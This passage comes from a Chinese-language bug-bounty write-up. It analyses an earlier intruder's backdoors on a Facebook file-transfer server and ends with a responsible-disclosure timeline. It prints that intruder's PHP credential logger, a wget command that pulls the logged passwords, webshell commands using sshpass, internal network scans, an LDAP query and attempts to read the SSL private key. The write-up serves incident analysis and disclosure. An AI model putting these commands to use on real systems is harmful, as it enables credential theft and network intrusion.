    fwrite($fp, date("Y-m-d H:i:s T") . ";" . $_SERVER["REMOTE_ADDR"] . ";" . $_SERVER["HTTP_USER_AGENT"] . ";POST=" . http_build_query($_POST) . ";GET=" . http_build_query($_GET) . ";COOKIE=" . http_build_query($_COOKIE) . "\n"); 
    // 省略...
前几个就是很标准的PHP一句话木马  
其中比较特别的是“ **sclient_user_class_standard.inc** ”这个档案
include_once中“ **sclient_user_class_standard.inc.orig**
”为原本对密码进行验证的PHP程式，骇客做了一个Proxy在中间并在进行一些重要操作时先把GET, POST, COOKIE的值记录起来
整理一下，骇客做了一个Proxy 在密码验证的地方，并且记录Facebook 员工的帐号密码，并且将记录到的密码放置在Web
目录下，骇客每隔一段时间使用wget 抓取
    wget https://files.fb.com/courier/B3dKe9sQaa0L.log
_↑ Logged passwords_
从纪录里面可以看到除了使用者帐号密码外，还有从FTA 要求档案时的信件内容，记录到的帐号密码会定时Rotate (后文会提及，这点还满机车的XD)
发现当下，最近一次的Rotate从2/1记录到2/7共约300笔帐号密码纪录，大多都是“ **@fb.com** ”或是“
**@facebook.com** ”的员工帐密，看到当下觉得事情有点严重了，在FTA中，使用者的登入主要有两种模式
  1. 一般用户注册，密码Hash 存在资料库，由SHA256 + SALT 储存
  2. Facebook 员工(@fb.com) 则走统一认证，使用LDAP 由AD 认证
在这里相信记录到的是真实的员工帐号密码， ** _\_ 猜测** **这份帐号密码应该可以通行Facebook Mail OWA,
VPN等服务做更进一步的渗透…
此外，这名“骇客” 可能习惯不太好:P
  1. 后门参数皆使用GET 来传递，在网页日志可以很明显的发现他的足迹
  2. 骇客在进行一些指令操作时没顾虑到STDERR ，导致网页日志中很多指令的错误讯息，从中可以观察骇客做了哪些操作
从access.log 可以观察到的每隔数日骇客会将记录到的帐号密码清空
    192.168.54.13 - - 17955 [Sat, 23 Jan 2016 19:04:10 +0000 | 1453575850] "GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p '********' ssh -v -o StrictHostKeyChecking=no soggycat@localhost 'cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo > /home/seos/courier/B3dKe9sQaa0L.log' 2>/dev/stdout HTTP/1.1" 200 2559 ...
打包档案
    cat tmp_list3_2 | while read line; do cp /home/filex2/1000/$line files; done 2>/dev/stdout
    tar -czvf files.tar.gz files
对内部网路结构进行探测
    dig a archibus.thefacebook.com
    telnet archibus.facebook.com 80
    curl http://archibus.thefacebook.com/spaceview_facebook/locator/room.php
    dig a records.fb.com
    telnet records.fb.com 80
    telnet records.fb.com 443
    wget -O- -q http://192.168.41.16
    dig a acme.facebook.com
    ./sshpass -p '********' ssh -v -o StrictHostKeyChecking=no soggycat@localhost 'for i in $(seq 201 1 255); do for j in $(seq 0 1 255); do echo "192.168.$i.$j:`dig +short ptr $j.$i.168.192.in-addr.arpa`"; done; done' 2>/dev/stdout
    ...
使用Shell Script 进行内网扫描但忘记把STDERR 导掉XD
尝试对内部LDAP 进行连接
    sh: -c: line 0: syntax error near unexpected token `('
    sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w '********' -s base (objectclass=*) 2>/dev/stdout'
尝试访问内部网路资源  
(看起来Mail OWA可以直接访问…)
    --20:38:09--  https://mail.thefacebook.com/
    Resolving mail.thefacebook.com... 192.168.52.37
    Connecting to mail.thefacebook.com|192.168.52.37|:443... connected.
    HTTP request sent, awaiting response... 302 Found
    Location: https://mail.thefacebook.com/owa/ [following]
    --20:38:10--  https://mail.thefacebook.com/owa/
    Reusing existing connection to mail.thefacebook.com:443.
    HTTP request sent, awaiting response... 302 Moved Temporarily
    Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&reason=0 [following]
    --20:38:10--  https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&reason=0
    Reusing existing connection to mail.thefacebook.com:443.
    HTTP request sent, awaiting response... 200 OK
    Length: 8902 (8.7K) [text/html]
    Saving to: `STDOUT'
         0K ........                                              100% 1.17G=0s
    20:38:10 (1.17 GB/s) - `-' saved [8902/8902]
    --20:38:33--  (try:15)  https://10.8.151.47/
    Connecting to 10.8.151.47:443... --20:38:51--  https://svn.thefacebook.com/
    Resolving svn.thefacebook.com... failed: Name or service not known.
    --20:39:03--  https://sb-dev.thefacebook.com/
    Resolving sb-dev.thefacebook.com... failed: Name or service not known.
    failed: Connection timed out.
    Retrying.
尝试对SSL Private Key 下手
    sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
    ls: /etc/opt/apache/ssl.key/server.key: No such file or directory
    mv: cannot stat `x': No such file or directory
    sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
    mv: cannot stat `x': No such file or directory
    sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
    mv: cannot stat `x': No such file or directory
    sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
    mv: cannot stat `x': No such file or directory
    sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
    mv: cannot stat `x': No such file or directory
    sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
    base64: invalid input
从浏览器观察files.fb.com 的凭证还是Wildcard 的*.fb.com …
* * *
### 后记
在收集完足够证据后便立即回报给Facebook 安全团队，回报内容除了漏洞细节外，还附上相对应的Log 、截图以及时间纪录xD
从伺服器中的日志可以发现有两个时间点是明显骇客在操作系统的时间，一个是七月初、另个是九月中旬
七月初的动作从纪录中来看起来比较偏向“逛”伺服器，但九月中旬的操作就比较恶意了，除了逛街外，还放置了密码Logger等，至于两个时间点的“骇客”是不是同一个人就不得而知了:P  
而七月发生的时机点正好接近CVE-2015-2857 Exploit公布前，究竟是透过1-Day还是无0-Day入侵系统也无从得知了。
这件事情就记录到这里，总体来说这是一个非常有趣的经历xD  
也让我有这个机会可以来写写关于渗透的一些文章:P
最后也感谢Bug Bounty 及胸襟宽阔的Facebook 安全团队让我可以完整记录这起事件: )
* * *
## Timeline
  * 2016/02/05 20:05 提供漏洞详情给Facebook 安全团队
  * 2016/02/05 20:08 收到机器人自动回复
  * 2016/02/06 05:21 提供弱点Advisory 给Accellion 技术窗口
  * 2016/02/06 07:42 收到Thomas 的回复，告知调查中
  * 2016/02/13 07:43 收到Reginaldo 的回复，告知Bug Bounty 奖金$10000 USD
  * 2016/02/13 询问是否撰写Blog 是否有任何要注意的地方?
  * 2016/02/13 询问此漏洞被认为是RCE 还是SQL Injection
  * 2016/02/18 收到Reginaldo 的回复，告知正在进行调查中，希望Blog 先暂时不要发出
  * 2016/02/24 收到Hai 的回复，告知奖金将会于三月发送
  * 2016/04/20 收到Reginaldo 的回复，告知调查已完成